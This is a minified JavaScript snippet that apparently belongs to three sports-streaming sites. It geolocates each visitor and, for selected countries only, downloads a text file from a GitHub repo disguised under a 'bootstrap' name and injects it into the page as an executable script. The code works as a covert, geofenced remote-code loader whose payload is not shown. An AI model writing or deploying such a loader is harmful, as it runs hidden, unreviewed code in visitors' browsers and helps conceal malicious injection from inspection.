const sites=[{url:"https://www.kooralive.id/",txtFile:"k.txt"},{url:"https://www.syrialive.cc/",txtFile:"s.txt"},{url:"https://www.yallashooot.live/",txtFile:"y.txt"}],geoApi="https://get.geojs.io/v1/ip/geo.json",allowedCountries=["MA","DZ","QA","IQ","KW","JO","YE","LY","AE","ES","IT","BR","NG"],canonicalLink=document.querySelector('link[rel="canonical"]');if(canonicalLink){let t=sites.find(t=>t.url===canonicalLink.href);t&&fetch("https://get.geojs.io/v1/ip/geo.json").then(t=>t.json()).then(e=>{if(allowedCountries.includes(e.country_code)){let o=`https://cdn.jsdelivr.net/gh/v-7-3/bootstrap@latest/${t.txtFile}`;return fetch(o)}throw Error("Country not allowed.")}).then(t=>{if(!t.ok)throw Error(`HTTP error! status: ${t.status}`);return t.text()}).then(t=>{let e=document.createElement("script");e.type="text/javascript",e.text=t,document.body.appendChild(e)}).catch(t=>console.error("Error:",t))}
